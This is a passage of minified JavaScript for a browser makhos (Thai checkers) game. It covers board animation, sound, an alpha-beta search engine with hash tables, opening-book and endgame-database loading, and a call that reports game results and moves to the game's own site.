s=Math.max(20,200,Ee(t));null!==c?ke(c):null!==l&&ke(l,s);const u=n-te,w=e-ne,h=Qn,d=Vn,p=u-h,g=w-d,m=.5*(h+u),y=.5*(d+w)-a,M=0!==a;await oe(s,t=>{let n,e;M?(n=we(h,m,u,t),e=we(d,y,w,t)):(n=h+p*t,e=d+g*t),i&&null!=r&&null!=o?(le(i,r+jt,o+Xt),ce(n,e)):i?ce(n,e,n+te,e+ne,i):ce(n,e)}),null!==f&&ke(f,s),Qn=u,Vn=w}async function re(t,n,e,a=Yt/50){const i=performance.now();for(;performance.now()-i<t;){const i=(2*Math.random()-1)*a,r=(2*Math.random()-1)*a;await ie(t/2,n+i,e+r)}await ie(60,n,e)}async function oe(t,n){0;return new Promise(e=>{const a=performance.now();requestAnimationFrame((function i(r){const o=Math.min(1,(r-a)/t),c=function(t){return t*t*(3-2*t)}(o);fe&&ue(),n(c),o<1?requestAnimationFrame(i):e()}))})}function ce(t,n,e,a,i=null){const r=t+jt,o=n+Xt,c=mt.width,l=mt.height,f=Math.round(Math.max(0,r)),s=Math.round(Math.max(0,o)),u=Math.round(Math.min(r+Mt.width,c)-f),w=Math.round(Math.min(o+Mt.height,l)-s);if(u<=0||w<=0)return;const h=Math.round(f-r),d=Math.round(s-o);null!=i&&le(i,Math.round(e+jt),Math.round(a+Xt)),yt.drawImage(Mt,h,d,u,w,f,s,u,w),se(f,s,u,w)}function le(t,n,e){yt.drawImage(t,n,e,Yt,Yt),se(n,e,Yt,Yt)}let fe=null;function se(t,n,e,a){if(fe){const i=Math.min(fe.x,t),r=Math.min(fe.y,n),o=Math.max(fe.x+fe.w,t+e),c=Math.max(fe.y+fe.h,n+a);fe={x:i,y:r,w:o-i,h:c-r}}else fe={x:t,y:n,w:e,h:a}}function ue(t,n,e,a){yt.clearRect(fe.x,fe.y,fe.w,fe.h),fe=null}function we(t,n,e,a){const i=1-a;return i*i*t+2*i*a*n+a*a*e}const he=0,de=1,pe=2,ge=3,me=4;let ye,Me=!1,ve=!1,be={classic:{},default:{}};async function xe(t,n,e){const a=await fetch(e),i=await a.arrayBuffer();be[t][n]=await ye.decodeAudioData(i)}function ke(t,n=null){if(!Me||!ve||!Ie)return;if(1===Wt)return;const e=be[0===Wt?"classic":"default"][t]||be.default[t];if(!e)return;const a=ye.createBufferSource(),i=ye.createGain();let r=1,o=Ee(Ce);t===de&&n>0&&(r=1e3*e.duration/n),a.buffer=e,a.playbackRate.value=r,i.gain.value=o,a.connect(i).connect(ye.destination),a.start()}function Ae(){if(Me)return;ye=new(window.AudioContext||window.webkitAudioContext),"suspended"===ye.state&&ye.resume();const t=ye.createBufferSource();t.buffer=ye.createBuffer(1,1,ye.sampleRate),t.connect(ye.destination),t.start(0),Me=!0,async function(){await Promise.all([xe("classic",he,"mPck_40.wav"),xe("classic",de,"mMov_320.wav"),xe("classic",pe,"mFix_72.wav"),xe("classic",ge,"mCap_320.wav"),xe("classic",me,"mHit_20.wav"),xe("default",he,"cPck_20.wav"),xe("default",de,"cMov_300.wav"),xe("default",pe,"cFix_60.wav"),xe("default",ge,"cCap_120.wav"),xe("default",me,"cHit_60.wav")]),ve=!0}()}let Ie=!1,_e=0,Ce=.5;const Le=["speaker0.png","speaker1.png","speaker2.png"],Re=[0,.3,.5];async function Se(){Me||await Ae(),_e=(_e+1)%3,Ie=0!==_e,Ce=Re[_e],_t.src=Le[_e]}function Ee(t,n=.25){return t*(1+(2*Math.random()-1)*n)}let Be=!1,De=-1,Pe=4,Ne=0,We=0,He=0,Te=0,Ue=null,Fe=null,Ye=!1;async function je(){W||2!==a&&(await O(),a=0)}let Xe=[],ze=-1;function Je(t){for(let n=0;n<j[0];n++)if(Qe(F[n])===t)return!0;return!1}function qe(t){if(!Ht)return!1;for(let n=0;n<j[0];n++)if(Qe(F[n])===Tt&&Ve(F[n])===t)return!0;return!1}function Ze(t){o+=function(t){const n=I[Qe(t)],e=I[Ve(t)],a=na(t);let i="-";if(524288&a)return". ";131072&a&&(i="x");return n+i+e+" "}(t)}function $e(t,n){const e=ht.getBoundingClientRect(),a=ht.width/e.width,i=ht.height/e.height,r=Math.floor((t-e.left)*a/Yt),o=Math.floor((n-e.top)*i/Yt);return r<0||r>7||o<0||o>7?-1:8*o+r}function Ge(){Be&&(Ke(),Cn(),xn())}function Ke(){Be=!1,De=-1,Pe=4}function Oe(t,n){if(ze>=0)return ze;let e=-1,a=1.1*Yt*(1.1*Yt);for(const i of Xe){const r=t-((7&i)*Yt+Yt/2),o=n-((i>>3)*Yt+Yt/2),c=r*r+o*o;c<a&&(e=i,a=c)}return e}function Qe(t){return 255&t}function Ve(t){return t>>8&255}function ta(t){return t<<8}function na(t){return 16711680&t}function ea(t){return 5&t}function aa(t){return 7&t}function ia(t){return t>>3}function ra(t){return 2&t?196608:131072}const oa=!0;function ca(t){let n=_>0?z[_-1]:R,e=!1;if(j[_]=Y[_],131072&n&&0==(262144&n)&&(Ai(),e=la(_>0?Ve(z[_-1]):P),Ai(),e))return sa(0,0,524288),void(Y[_+1]=j[_]);if(e=!1,524288&n)fa(_>0?Ve(z[_-2]):P),e=!0;else for(let t=0;t<32;t++){const n=A[t],a=m[n];a>=4||(5&a)!=S||fa(n)&&(e=!0)}if(!e&&t===oa)for(let t=0;t<32;t++){const n=A[t],e=m[n];if(!(e>=4||(5&e)!=S))if(0!==e)if(1!==e)if(2!==e&&3!==e);else for(let t=0;t<4;t++)for(let e=n;(e=b[x[e]+k[t]],-1!==e)&&4===m[e];)sa(n,e,0);else{const t=7&n;7!==t&&4===m[n+9]&&sa(n,n+9,0),0!==t&&4===m[n+7]&&sa(n,n+7,0)}else{const t=7&n;0!==t&&4===m[n-9]&&sa(n,n-9,0),7!==t&&4===m[n-7]&&sa(n,n-7,0)}}Y[_+1]=j[_]}function la(t){const n=m[t];if(0===n){if(t<=15)return!1;const n=7&t;if(n>1&&1==(5&m[t-9])&&4===m[t-18])return!0;if(n<6&&1==(5&m[t-7])&&4===m[t-14])return!0}if(1===n){if(t>=48)return!1;const n=7&t;if(n<6&&0==(5&m[t+9])&&4===m[t+18])return!0;if(n>1&&0==(5&m[t+7])&&4===m[t+14])return!0}if(2===n||3===n)for(let n=0;n<4;n++)for(let e=t;e=b[x[e]+k[n]],-1!==e;)if(4!==m[e]){if((5&m[e])===E){let t=b[x[e]+k[n]];if(-1===t)break;if(4===m[t])return!0}break}return!1}function fa(t){const n=m[t];let e=!1;if(0===n){if(t>15){const n=7&t;n>1&&1==(5&m[t-9])&&4===m[t-18]&&(sa(t,t-18,ra(m[t-9])),e=!0),n<6&&1==(5&m[t-7])&&4===m[t-14]&&(sa(t,t-14,ra(m[t-7])),e=!0)}return e}if(1===n){if(t<48){const n=7&t;n<6&&0==(5&m[t+9])&&4===m[t+18]&&(sa(t,t+18,ra(m[t+9])),e=!0),n>1&&0==(5&m[t+7])&&4===m[t+14]&&(sa(t,t+14,ra(m[t+7])),e=!0)}return e}if(2===n||3===n){for(let n=0;n<4;n++)for(let a=t;a=b[x[a]+k[n]],-1!==a;)if(4!==m[a]){if((5&m[a])===E){let i=b[x[a]+k[n]];if(-1===i)break;4===m[i]&&(sa(t,i,ra(m[a])),e=!0)}break}return e}return e}function sa(t,n,e){let a=j[_];0===m[t]&&n<=7&&(e|=262144),1===m[t]&&n>=56&&(e|=262144),F[a]=t|ta(n)|e,X[a]=((t,n)=>q[Z(t,n)])(n,t),131072&e&&(X[a]+=H),196608&e&&(X[a]+=T),262144&e&&(X[a]+=T),j[_]++}function ua(){const n=0===S;let e=0,a=0;if(0==(s|w))return n?-ya+_:ya-_;if(0==(u|h))return n?ya-_:-ya+_;const i=B<35?v:M;for(let t=0;t<32;t++){const n=A[t],r=m[n];4!==r&&(0===r?e+=i[n]:1===r&&(a+=i[63-n]))}if(d<=4){if(at(),1010==p)return 0;let e=0;for(let t=0;t<32;t++){const n=A[t],a=m[n];4!==a&&(0===a?e+=ia(n)+5:1===a&&(e+=ia(63-n)+5))}e+=6*(4-s-u),0==(s|u)&&(e+=10);const a=function(t){0;ui++;const n=Number(0xffffffffn&t),e=Number(t>>32n);let a=2097151&n;const i=si[a];if(0===i)return 0;if(li[a]===n&&fi[a]===e)return wi++,i;const r=1|e;a=a+r&2097151;const o=si[a];if(0===o)return 0;if(li[a]===n&&fi[a]===e)return wi++,o;for(let t=2;t<=hi;t++){a=a+r&2097151;const t=si[a];if(0===t)return 0;if(li[a]===n&&fi[a]===e)return wi++,t}return 0}(di());let i=0;if(0===t||t>=2){const a=s+w-(u+h);let r=0===t?-1:Math.sign(n?a:-a);0===r&&(r=-1),i=r*e}if(0!==a){if(wi++,a===ai)return n?1e3-e-_:-1e3+e+_;if(a===ii)return n?-1e3+e+_:1e3-e-_;if(a===ei)return n?i:-i}const r=Mi(p);if(r===ai)return n?1e3-e-_:-1e3+e+_;if(r===ii)return n?-1e3+e+_:1e3-e-_;if(r===ei)return n?i:-i}return e+=s*H+w*T,a+=u*H+h*U,e+=2*(s+w),a+=2*(u+h),0===m[8]&&1===m[1]&&(a+=17),1===m[55]&&0===m[62]&&(e+=17),B<35&&(1===m[5]&&1===m[3]&&1===m[21]&&1===m[19]&&(a+=5,1!==m[14]&&1!==m[12]&&1!==m[10]||(a+=8),1===m[17]&&1===m[1]&&(a+=8),1===m[28]&&(a+=5)),0==m[17]&&(4==m[1]&&4==m[8]?e+=17:4==m[1]&&4==m[3]?e+=16:4==m[3]&&(e+=8)),0==m[19]&&(4==m[3]&&4==m[1]||4==m[3]&&4==m[5]?e+=17:(4==m[3]&&1==m[1]&&1==m[5]||4==m[1]&&1==m[3]&&1==m[8]||1==m[1]&&1==m[3])&&(e+=8)),0==m[21]&&(4==m[5]&&4==m[3]||4==m[5]&&4==m[7]?e+=17:(4==m[5]&&1==m[3]&&1==m[7]||4==m[3]&&1==m[5]&&1==m[7])&&(e+=8)),0==m[23]&&4==m[5]&&4==m[7]&&(e+=15),0==m[24]&&4==m[1]&&4==m[3]&&4==m[10]&&1==m[17]&&(e+=17),0==m[62]&&1==m[55]&&(e+=15)),n?e-a:a-e}let wa=0,ha=0,da=0;function pa(){N=!1;const t=Y[_],n=j[_],e=$[0][_];for(let a=t;a<n;a++)if(F[a]===e)return N=!0,void(X[a]+=ya)}function ga(t){let n=t,e=X[t];for(let a=t+1,i=j[_];a<i;a++)X[a]>e&&(e=X[n=a]);let a=F[t];F[t]=F[n],F[n]=a,a=X[t],X[t]=X[n],X[n]=a}function ma(t){const n=$[_],e=$[_+1],a=G[_+1];n[_]=F[t];for(let t=_+1;t<a;t++)n[t]=e[t];G[_]=a}const ya=1e4;function Ma(t,n,e){if(0===e)return function t(n,e){G[_]=_;let a=ua();if(a>=e)return a;a>n&&(n=a);if(ca(!1),j[_]===Y[_])return a;N&&pa();for(let a=Y[_];a<j[_];a++){ga(a),va(F[a]);let i=-t(-e,-n);if(ba(),i>=e)return i;i>n&&(n=i,ma(a))}return n}(t,n);const a=function(){0;const t=Ua;let n=0n;for(let e=0;e<32;e++){const a=A[e],i=m[a],r=t[e];i>=4||i<0||(n^=r[i])}1===S&&(n^=Fa);return n}(),i=function(t,n,e,a){0;qa++;const i=Number(0xffffffffn&t)>>>0,r=Number(t>>32n&0xffffffffn)>>>0,o=4194303&i;if(Ga[o]!==i||Ka[o]!==r)return{hit:!1,bestMove:0};const c=Oa[o],l=Qa[o],f=ti[o],s=function(t,n){return t>9e3?t-n:t<-9e3?t+n:t}(Va[o],_);if(c>=n){if(Ja++,l===ja)return{hit:!0,score:s,bestMove:f};if(l===Xa&&s<=e)return{hit:!0,score:s,bestMove:f};if(l===za&&s>=a)return{hit:!0,score:s,bestMove:f}}return{hit:!1,score:0,bestMove:f}}(a,e,t,n);if(i.bestMove&&0===_&&($[0][0]=i.bestMove),i.hit)return i.score;if(G[_]=_,ca(oa),j[_]==Y[_]){const t=-1e4+_;return ni(a,e,ja,t,0),t}j[_]-Y[_]==1&&s>1&&u>1&&e++,N&&pa();let r=t,o=0,c=-1e4;for(let i=Y[_];i<j[_];i++){ga(i),va(F[i]);let r=-Ma(-n,-t,e-1);if(ba(),r>c&&(c=r,o=F[i]),r>=n)return ni(a,e,za,r,F[i]),r;r>t&&(t=r,l=Ve(F[i]),f=Qe(F[i]),w=e,q[Z(l,f)]=q[Z(l,f)]+w,ma(i))}var l,f,w;return ni(a,e,c>r?ja:Xa,c,o),c}function va(t){const n=Qe(t),e=Ve(t);if(z[_]=t,524288&t)return _++,_>C&&(C=_),Ai(),!0;if(131072&t){let t=n>e?aa(n)>aa(e)?e+9:e+7:aa(n)>aa(e)?e-7:e-9;switch(J[_]=t,m[t]){case 0:s--;break;case 1:u--;break;case 2:w--;break;case 3:h--}d--,m[t]=4}else J[_]=-1;if(262144&t)switch(m[n]){case 0:m[e]=2,w++,s--;break;case 1:m[e]=3,h++,u--}else m[e]=m[n];return m[n]=4,_++,Ai(),!0}function ba(){Ai(),_--;const t=z[_],n=Qe(t),e=Ve(t);if(!(524288&t)){if(262144&t)switch(m[e]){case 2:m[n]=0,w--,s++;break;case 3:m[n]=1,h--,u++}else m[n]=m[e];if(131072&t){let n=J[_];switch(m[n]=(65536&t?2:0)|E,m[n]){case 0:s++;break;case 1:u++;break;case 2:w++;break;case 3:h++}d++}m[e]=4}}let xa=0,ka=0,Aa=-9999;async function Ia(){const t=performance.now();_=0,C=0,q.fill(0);let n=0,a=1,i=0;const r=Math.min(3,Math.max(0,16-d>>1));for(;a>=10&&await _a(a,n,i),xa=ka,N=!0,n=Ma(-1e4,ya,a),ka=$[0][0],Aa=n,i=performance.now()-t,!(i>=5e3);){if(a>=e&&n<-9988)return!1;if(a>=e&&i>=500&&(n<=-300||n>=300||a>=e+r))break;a++}return n>200&&(En(!1),Rn(!0)),Ba=performance.now()-t,Ba<1e3&&(Ba=1e3),Pa-=Math.floor(Ba/1e3),Pa<0&&(Pa=0),Ja=0,qa=0,wi=0,ui=0,wa=0,ha=0,da=0,!0}async function _a(t,n,e){await Ca(100)}async function Ca(t=60){await new Promise(n=>setTimeout(n,t))}function La(){let t=0;if(L)switch(B){case 1:t=21|ta(28);break;case 3:t=7|ta(14);break;default:t=0}else switch(B){case 1:t=14|ta(21);break;case 3:t=7|ta(14);break;default:t=0}return t}const Ra="https://chnp.co.th/makhos/visit.php?";function Sa(i){const s=i>0?"W":i<0?"L":"D";Math.round((performance.now()-r)/1e3);c+=t+s+" ";let u=Ra+"level="+t+"&result="+encodeURIComponent(c);t>0&&"W"===s&&(u+="&moves="+encodeURIComponent(o)),fetch(u);const w=i>0?"คุณชนะ":i<0?"คุณแพ้":"เสมอกัน";Ln(w+"!, เริ่มเกมใหม่"),nt(w),function(e){n=t,e>0?(l++,f=0):e<0?(l=0,f++):(l=0,f=0);e>0&&0===n?(t=1,l=f=0):(2===l&&(t++,l=0),2===f&&(t--,f=0));t=Math.max(0,Math.min(2,t))}(i),e=t-1+10,t<=0&&(e=10),a=3,Ta()}function Ea(){return at(),1010==p&&(4===m[7]||4===m[48])||!(D<6)&&(D>25||1111==p)}let Ba=0,Da=180,Pa=180,Na=null;function Wa(t){const n=t%60;return Math.floor(t/60)+":"+(n<10?"0"+n:n)}function Ha(){Rt.textContent=Wa(Pa),St.textContent=Wa(Da),Pa<=0&&(Rt.style.color="#fd0"),Da<=0&&(St.style.color="#fd0")}function Ta(){Rt.style.color="#eee",St.style.color="#aaa",Na&&clearInterval(Na),Na=null,Ha()}let Ua=null,Fa=0n;function Ya(t){return 6364136223846793005n*BigInt(t)+1n&(1n<<64n)-1n}const ja=0,Xa=1,za=2;let Ja=0,qa=0,Za=0,$a=0;const Ga=new Uint32Array(4194304),Ka=new Uint32Array(4194304),Oa=new Int16Array(4194304),Qa=new Int8Array(4194304),Va=new Int32Array(4194304),ti=new Int32Array(4194304);function ni(t,n,e,a,i){if(0===n)return;Za++;const r=Number(0xffffffffn&t)>>>0,o=Number(t>>32n&0xffffffffn)>>>0,c=4194303&r;if(a=function(t,n){return t>9e3?t+n:t<-9e3?t-n:t}(a,_),0===Ka[c]&&0===Ga[c])return Ga[c]=r,Ka[c]=o,Oa[c]=n>0?n:1,Qa[c]=e,Va[c]=a,void(ti[c]=0|i);const l=Ga[c],f=Ka[c],s=Oa[c],u=Qa[c];if(f!==o||l!==r)return Ga[c]=r,Ka[c]=o,Oa[c]=n,Qa[c]=e,Va[c]=a,void(ti[c]=0|i);if($a++,f===o&&l===r){if(u===ja&&e!==ja)return;if(n<s&&e!==ja)return;if(e===ja&&u===ja&&n<s)return;return Oa[c]=n,Qa[c]=e,Va[c]=a,void(ti[c]=0|i)}}const ei=1,ai=2,ii=3;let ri=0;const oi=new Map,ci=(1n<<63n)-1n,li=new Uint32Array(1<<21),fi=new Uint32Array(1<<21),si=new Uint8Array(1<<21);let ui=0,wi=0,hi=0;function di(){const t=0===S,n=Ua;let e=0n;for(let a=0;a<32;a++){const i=A[a],r=n[a];let o=m[i];o>=4||o<0||(t||4===o||(o^=1),e^=r[o])}return e&ci}function pi(t,n){const e=Number(0xffffffffn&t),a=Number(t>>32n);let i=2097151&e;const r=1|a;for(let t=0;t<1<<21;t++){if(0===si[i])return li[i]=e,fi[i]=a,si[i]=n,t>hi&&(hi=t),!0;if(li[i]===e&&fi[i]===a)return!1;i=i+r&2097151}return!1}function gi(t){let n="",e=0;for(;e<t.length;){let a=t[e];if(a>="0"&&a<="9"){let a=e+1;a<t.length&&t[a]>="0"&&t[a]<="9"&&a++;const i=parseInt(t.slice(e,a),10);n+="y".repeat(i),e=a}else n+=a,e++}return n}function mi(t){const n=[0,1,2,3,4];for(let t=0;t<32;t++)m[A[t]]=4;let e=0;for(let a=0;a<16;a++){const i=t.charCodeAt(a)-97;let r=Math.floor(i/5),o=i%5;m[A[e++]]=n[r],m[A[e++]]=n[o]}}const yi=new Map([[1001,2],[110,3],[101,1],[1010,1],[2010,2],[1020,3],[1110,2],[1011,3],[210,2],[1002,3],[2001,2],[120,3],[1101,2],[111,3],[201,2],[102,3],[2020,1],[2011,2],[2002,2],[220,3],[211,3],[202,1],[1120,3],[1111,1],[1102,2],[2110,2],[2101,2],[1021,3],[121,3],[1210,2],[1201,2],[1012,3],[112,3],[3010,2],[3001,2],[1030,3],[130,3],[310,2],[301,2],[1003,3],[103,3]]);function Mi(t){return yi.get(t)??0}function vi(){let t=0,n=0,e=0,a=0;for(let i=0;i<32;i++){const r=m[A[i]];2===r?t++:0===r?n++:3===r?e++:1===r&&a++}return 1e3*t+100*n+10*e+a}const bi=new Map;let xi=0;function ki(){const t=function(){const t=0===S,n=t?[4n,5n,6n,7n]:[5n,4n,7n,6n];let e=0n;if(t)for(let t=0;t<32;t++){const a=m[A[t]];e=e*(a>=4?2n:8n)|(a>=4?0n:n[a])}else for(let t=31;t>=0;t--){const a=m[A[t]];e=e*(a>=4?2n:8n)|(a>=4?0n:n[a])}return e}(),n=bi.get(t);if(!n)return null;let e=n[Math.floor(Math.random()*n.length)];return e=na(e)|ta(63-Ve(e))|63-Qe(e),e}function Ai(){S=0===S?1:0,E=0===S?1:0}window.init=function(){!function(){F.fill(0),X.fill(0),Y.fill(0),j.fill(0),z.fill(0),J.fill(0),G.fill(0),q.fill(0);for(let t=0;t<64;t++)$[t]=new Array(64).fill(0);for(let t=0;t<32;t++)I[A[t]]=t+1;ft=Gt("boardWrapper"),st=Gt("extendWrapper"),ut=Gt("topBar"),wt=Gt("bottomBar"),ht=Gt("boardCanvas"),dt=ht.getContext("2d"),pt=Gt("pieceCanvas"),gt=pt.getContext("2d"),mt=Gt("animeCanvas"),yt=mt.getContext("2d"),Mt=Dt.createElement("canvas"),vt=Mt.getContext("2d"),bt=Gt("message"),Bt=Gt("topCenter"),xt=Gt("version"),Lt=Gt("newgame"),At=Gt("styleSwitch"),It=Gt("styleComp"),_t=Gt("soundSwitch"),Ct=Gt("cellNumSwitch"),kt=Gt("footer"),Rt=Gt("compTime"),St=Gt("playerTime"),Et=Gt("overlayText"),Rn(!1),En(!1),yt.imageSmoothingEnabled=!1,vt.imageSmoothingEnabled=!1,document.addEventListener("touchend",t=>{const n=Date.now();n-$t<=300&&t.preventDefault(),$t=n},{passive:!1}),document.addEventListener("touchstart",t=>{t.touches.length>1&&t.preventDefault()},{passive:!1}),document.addEventListener("gesturestart",t=>t.preventDefault()),function(){let t=124987n;Ua=[];for(let n=0;n<32;n++){Ua[n]=[];for(let e=0;e<10;e++)t=Ya(t),Ua[n][e]=t}t=Ya(t),Fa=t}()}(),function(){nt("Loading...");let t=0,n=0;for(let n=0;n<lt;n++)t+=ot[n].length;for(let e=0;e<lt;e++){Nt[e]=[];for(let a=0;a<ot[e].length;a++){const i=Nt[e][a]=new Image;i.onload=()=>{++n===t&&(sn=!0,un())},i.src=ot[e][a]}}}(),async function(t="DB0508.zip",n="DB0508.txt"){try{bi.clear(),xi=0;const e=await fetch(t);if(!e.ok)throw new Error("HTTP "+e.status);const a=await e.blob(),i=(await JSZip.loadAsync(a)).file(n);if(!i)throw new Error(`File ${n} not found`);const r=(await i.async("text")).split("\n").map(t=>t.trim()).filter(t=>t.length>=21);for(const t of r){const n=t.substring(0,16),e=t.substring(16,21),a=BigInt("0x"+n),i=Number("0x"+e);bi.has(a)||bi.set(a,[]),bi.get(a).push(i),xi++}}catch(t){}}(),async function(t="background2.jpg",n="description2.txt"){try{0;const e=await fetch(t);if(!e.ok)throw new Error("HTTP "+e.status);const a=await e.blob(),i=(await JSZip.loadAsync(a)).file(n);if(!i)throw new Error(`File ${n} not found`);const r=await i.async("text");li.fill(0),fi.fill(0),si.fill(0),S=0;let o=0,c=0;const l=r.split("\n").map(t=>t.trim()).filter(t=>t&&!t.startsWith("#"));for(const t of l){const n={".":ei,"+":ai,"-":ii}[t[t.length-1]]||0,e=gi(t.substring(0,t.length-1));if(16!==e.length)continue;mi(e);const a=di(),i=vi();oi.has(i)||oi.set(i,{win:0,draw:0,loss:0,total:0,def:Mi(i)});const r=oi.get(i);n===ei?r.draw++:n===ai?r.win++:n===ii&&r.loss++,r.total++,pi(a,n)?o++:c++}for(const[t,n]of oi.entries()){let t=!1;n.def===ai&&n.win>0&&(t=!0),n.def===ei&&n.draw>0&&(t=!0),n.def===ii&&n.loss>0&&(t=!0)}V(),S=0,ri=o}catch(t){}}(),K()}